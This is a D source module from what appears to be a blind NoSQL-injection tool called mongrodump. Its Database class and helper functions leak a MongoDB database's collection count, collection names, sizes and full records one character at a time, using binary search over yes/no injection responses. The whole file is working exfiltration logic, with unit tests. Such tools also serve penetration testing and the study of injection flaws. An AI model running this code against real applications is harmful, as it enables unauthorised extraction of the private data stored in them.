module mongrodump.database;

import std.conv;
import std.format;

import mongrodump.logger;
import mongrodump.query;
import mongrodump.oracle;

/**
 * Interface to the database through an injection.
 *
 * It allows dumping all or part of a database through an Oracle.
 */
class Database {
    ulong    collectionNumber;
    string[] collections;
    Oracle   oracle;

    /** Builds with a given oracle */
    this(Oracle oracle) {
        this.oracle = oracle;
        collectionNumber = getCollectionNumber();
    }

    /** Number of collections existing in the database */
    ulong getCollectionNumber(ulong maxNumber=10_000) {
        if (collectionNumber == 0) {
            collectionNumber = oracle.getValue("db.getCollectionNames().length",
                                               0, maxNumber);
            log(2, "[-] Number of collections: " ~ collectionNumber.to!string);
        }
        return collectionNumber;
    }

    /** Name of the index-th collection */
    string getCollectionName(ulong index) {
        string name = oracle.getString("db.getCollectionNames()[%s]"
                            .format(index));

        log(2, "[-] Collections: " ~ name);
        return name;
    }

    /** All collection names from the database */
    string[] getCollections() {
        if (collections.length == 0)
            for (ulong i ; i<collectionNumber ; i++)
                collections ~= getCollectionName(i);
        return collections;
    }

    /** Full content of a collection in the form of a JSON string */
    string getCollectionData(string collection) {
        return oracle.getString("tojsononeline(db.%s.find())"
                                .format(collection));
    }

    /** Full content of a collection in the form of a JSON string */
    ulong getCollectionSize(string collection, ulong maxSize=10_000) {
        ulong size = oracle.getValue("db.%s.find().length".format(collection),
                                     0, maxSize);

        log(2, "[-] Size of " ~ collection ~ ": " ~ size.to!string);
        return size;
    }

    /** Full content of a collection element in the form of a JSON string */
    string getCollectionElement(string collection, ulong index) {
        string element = oracle.getString("tojsononeline(db.%s.find()[%d])"
                                          .format(collection, index));

        log(2, "[-] Element: " ~ element);
        return element;
    }
}

/**
 * Builds the part of the request comparing two numerical values.
 */
string greaterThan(T)(string what, T value) {
    import std.conv;
    return format("(%s) >= (%s)", what, value.to!string);
}
unittest {
    assert("id".greaterThan(15)  == "(id) >= (15)");
    assert("id".greaterThan("'a'") == "(id) >= ('a')");
}

/**
 * Returns a bounded numerical value leaked through an oracle.
 *
 * In case of error with the Oracle 0 is returned.
 */
T getValue(T)(Oracle oracle, string what, T from, T to) {
    import std.exception: enforce;
    enforce(from <= to, "Wrong order of arguments");

    while (true) {
        T pivot = cast(T)(from + (to - from) / 2);

        if (pivot == from) {
            final switch (oracle.ask(what.greaterThan(to))) {
                case OracleAnswer.Yes:
                    return to;
                case OracleAnswer.No:
                    return from;
                case OracleAnswer.Error:
                    return 0;
            }
        }
        else {
            final switch (oracle.ask(what.greaterThan(pivot))) {
                case OracleAnswer.Yes:
                    from = pivot;
                    break;

                case OracleAnswer.No:
                    to = pivot;
                    break;

                case OracleAnswer.Error:
                    return 0;
            }
        }
    }
}
unittest {
    auto query  = new TestQuery();
    auto oracle = new Oracle(query, "True", "False");

    query.answer = 97;
    assert(oracle.getValue("none", 0, 200) == 0);
    assert(oracle.getValue("id",   0, 200) == 97);

    query.answer = 'z';
    assert(oracle.getValue("id", 0, 200) == 122);
}

char getChar(Oracle oracle, string what) {
    char from = char.min;
    char to   = char.max;

    while (true) {
        char pivot = cast(char)(from + (to - from) / 2);

        if (pivot == from) {
            string value = format("'%c'", to);
            if (value == "'''")
                value = "'\\''";

            final switch (oracle.ask(what.greaterThan(value))) {
                case OracleAnswer.Yes:
                    return to;
                case OracleAnswer.No:
                    return from;
                case OracleAnswer.Error:
                    return 0;
            }
        }
        else {
            string value = format("'%c'", pivot);
            if (value == "'''")
                value = "'\\''";

            final switch (oracle.ask(what.greaterThan(value))) {
                case OracleAnswer.Yes:
                    from = pivot;
                    break;

                case OracleAnswer.No:
                    to = pivot;
                    break;

                case OracleAnswer.Error:
                    return 0;
            }
        }
    }
}

/**
 * Returns a string leaked through an oracle.
 *
 * By default, only supports strings shorter than maxValue characters.
 */
string getString(Oracle oracle, string what, ulong maxValue=1_000_000_000) {
    immutable length = oracle.getValue("%s.length".format(what), 0, maxValue);

    auto logger = Logger.get();

    string result;
    for (ulong i ; i<length ; i++) {
        char c = cast(char) oracle.getChar("%s[%d]".format(what, i));
        if (logger.verbosity >= 3) {
            logger.outputFile.write(c);
            logger.outputFile.flush();
        }
        result ~= c;
    }

    return result;
}
